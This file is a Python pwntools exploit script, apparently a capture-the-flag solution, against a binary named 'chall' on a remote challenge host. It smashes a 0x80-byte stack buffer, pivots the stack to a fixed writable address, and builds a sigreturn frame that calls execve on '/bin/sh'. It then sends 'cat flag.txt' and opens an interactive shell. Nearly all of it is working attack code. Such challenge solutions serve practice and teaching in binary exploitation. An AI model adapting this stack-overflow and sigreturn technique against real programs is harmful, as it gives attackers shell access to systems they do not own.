#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 30211
HOST = "chall.v1t.site"
exe = context.binary = ELF('./chall', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            b* 0x000000000040122D
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE
puts_plt = exe.plt.puts
main = exe.sym.main
rw_section = 0x404800
pop_rax = 0x00000000004011ef
syscall = 0x00000000004011f1

# PAYLOAD
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x404100
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0x404100
frame.rip = syscall

payload = flat(
    b'a'*0x80,
    0x404100 + 0x80,
    main + 27
    )
p.sendafter(b'pond.\n', payload)

input("Press ENTER")
payload = flat(
    b'/bin/sh'.ljust(0x80, b'\0'),
    0x404100 + 0x80,
    pop_rax,
    0xf,
    syscall,
    bytes(frame)
    )
p.sendline(payload)

p.sendline(b'cat flag.txt')

p.interactive()